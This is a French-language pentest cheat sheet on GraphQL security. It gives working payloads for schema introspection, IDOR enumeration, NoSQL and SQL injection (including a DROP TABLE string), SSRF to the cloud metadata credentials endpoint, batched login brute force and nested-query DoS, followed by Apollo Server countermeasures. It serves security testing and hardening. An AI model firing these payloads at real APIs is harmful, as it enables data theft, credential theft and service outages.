---
title: GraphQL Security
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [graphql, api, introspection, injection, sécurité, web]
date: 2026-03-22
---

# GraphQL Security

GraphQL est un langage de requête pour API qui remplace REST. Sa flexibilité et sa puissance introduisent des vecteurs d'attaque spécifiques absents des API REST classiques.

## Rappel GraphQL

```graphql
# Requête (équivalent GET REST)
query {
  user(id: "1") {
    username
    email
    role
  }
}

# Mutation (équivalent POST/PUT/DELETE)
mutation {
  updateUser(id: "1", role: "admin") {
    id
    role
  }
}

# Subscription (temps réel via WebSocket)
subscription {
  newMessage {
    content
    author
  }
}
```

## Introspection — cartographie du schéma

L'introspection permet de découvrir l'intégralité du schéma GraphQL : types, requêtes, mutations, champs.

```bash
# Requête d'introspection complète
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name kind } } } } }"}'

# Introspection sur les types spécifiques
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}'

# Récupérer toutes les mutations disponibles
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { mutationType { fields { name args { name type { name } } } } } }"}'
```

### InQL — Burp extension pour GraphQL

```
Extension Burp Suite : InQL
→ Charge automatiquement le schéma via introspection
→ Génère toutes les requêtes et mutations possibles
→ Interface pour les tester dans Repeater
```

```bash
# InQL en ligne de commande
pip install inql
inql -t https://target.com/graphql -o ./graphql_schema/
# → Génère des fichiers .graphql pour chaque requête/mutation
```

## Attaques d'introspection

```bash
# Si l'introspection est désactivée en production, tenter des variantes
# Field suggestion (GraphQL suggère les champs proches en cas d'erreur)
{"query": "{ usr { id } }"}
# → Error: "Did you mean 'user'?" → révèle les noms de champs

# Fragment sur __schema (contourne certains filtres)
{"query": "fragment a on __Schema { types { name } } { __schema { ...a } }"}

# Introspection via GET (certains serveurs l'acceptent)
curl "https://target.com/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D"
```

## IDOR et BOLA via GraphQL

```graphql
# Accès direct à un objet par ID — manque de vérification d'autorisation
query {
  user(id: "2") {      # Changer l'ID pour accéder aux données d'autres utilisateurs
    email
    creditCard
    privateMessages { content }
  }
}

# Énumération d'IDs
query {
  user(id: "1") { email }
}
# Tester 1, 2, 3... dans Intruder Burp → accès aux données de tous les utilisateurs
```

## Injection GraphQL

```graphql
# Injection NoSQL dans les arguments
query {
  user(username: {$ne: ""}) {    # Si l'argument est passé directement à MongoDB
    id
    email
    password
  }
}

# Injection SQL dans un argument résolveur
query {
  products(filter: "'; DROP TABLE products; --") {
    name
  }
}

# SSRF via un champ URL
mutation {
  importData(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") {
    result
  }
}
```

## Batching Attacks

GraphQL permet d'envoyer plusieurs opérations dans une seule requête HTTP — contournant les rate limits.

```bash
# Batching de requêtes (tableau JSON)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "mutation { login(username: \"admin\", password: \"password1\") { token } }"},
    {"query": "mutation { login(username: \"admin\", password: \"password2\") { token } }"},
    {"query": "mutation { login(username: \"admin\", password: \"password3\") { token } }"}
  ]'
# → 1000 tentatives de login en une seule requête HTTP → bypass du rate limit par requête

# Aliases (batching alternatif dans une seule requête)
{
  a1: login(username: "admin", password: "pass1") { token }
  a2: login(username: "admin", password: "pass2") { token }
  a3: login(username: "admin", password: "pass3") { token }
}
```

## Nested Queries — DOS par profondeur

```graphql
# Requête profondément imbriquée → explosion exponentielle du coût
query {
  user {
    friends {
      friends {
        friends {
          friends {
            friends {
              # ... encore 50 niveaux → serveur surchargé
              email
            }
          }
        }
      }
    }
  }
}
```

## Field Duplication

```graphql
# Répéter le même champ des milliers de fois dans une requête
query {
  user(id: "1") {
    email email email email email email email email email email
    # ... × 10000 → DoS par traitement
  }
}

# Alias abuse
query {
  a1: user(id: "1") { email }
  a2: user(id: "1") { email }
  # ... × 1000 → DoS
}
```

## Mass Assignment

```graphql
# Si le schéma expose des champs qui ne devraient pas être modifiables
mutation {
  updateProfile(
    name: "alice"
    role: "admin"        # Ce champ ne devrait pas être modifiable
    creditLimit: 999999  # Ni celui-ci
  ) {
    id
    role
    creditLimit
  }
}
```

## Fingerprinting GraphQL

```bash
# Identifier l'implémentation GraphQL (différentes réponses aux erreurs)
curl -X POST https://target.com/graphql -d '{"query": "notAQuery"}'
# Apollo Server → {"errors":[{"message":"Syntax Error...","locations":[...]}]}
# graphql-java  → {"errors":[{"message":"Invalid syntax..."}]}
# Hasura        → {"errors":[{"extensions":{"code":"parse-failed"}}]}

# Endpoint communs à tester
/graphql
/api/graphql
/graphql/v1
/v1/graphql
/api
/query
/gql

# Méthodes GET et POST (certains endpoints GraphQL acceptent GET)
GET /graphql?query={__typename}
```

## Outils

```bash
# Clairvoyance — reconstruit le schéma même si l'introspection est désactivée
# (via field suggestions d'erreur)
pip install clairvoyance
clairvoyance https://target.com/graphql -o schema.json

# graphw00f — fingerprint de l'implémentation GraphQL
pip install graphw00f
graphw00f -d -t https://target.com/graphql

# GraphQL Cop — scanner automatique de misconfigs
pip install graphql-cop
graphql-cop -t https://target.com/graphql -o json

# Altair / GraphiQL (GUI pour tester des requêtes interactivement)
```

## Contre-mesures

```javascript
// Désactiver l'introspection en production (Apollo Server)
const server = new ApolloServer({
  schema,
  introspection: process.env.NODE_ENV !== 'production',
});

// Limiter la profondeur des requêtes
const depthLimit = require('graphql-depth-limit');
const server = new ApolloServer({
  validationRules: [depthLimit(5)],  // Max 5 niveaux d'imbrication
});

// Limiter la complexité
const { createComplexityLimitRule } = require('graphql-validation-complexity');
const complexityLimit = createComplexityLimitRule(1000);

// Rate limiting sur les opérations (pas seulement les requêtes HTTP)
// Désactiver le batching si non nécessaire
// Apollo Server
const server = new ApolloServer({
  allowBatchedHttpRequests: false,
});

// Authorisation par champ (ne pas exposer des champs sensibles sans vérification)
const resolvers = {
  User: {
    creditCard: (user, args, context) => {
      if (context.user.id !== user.id && !context.user.isAdmin) {
        throw new ForbiddenError("Accès refusé");
      }
      return user.creditCard;
    }
  }
};
```
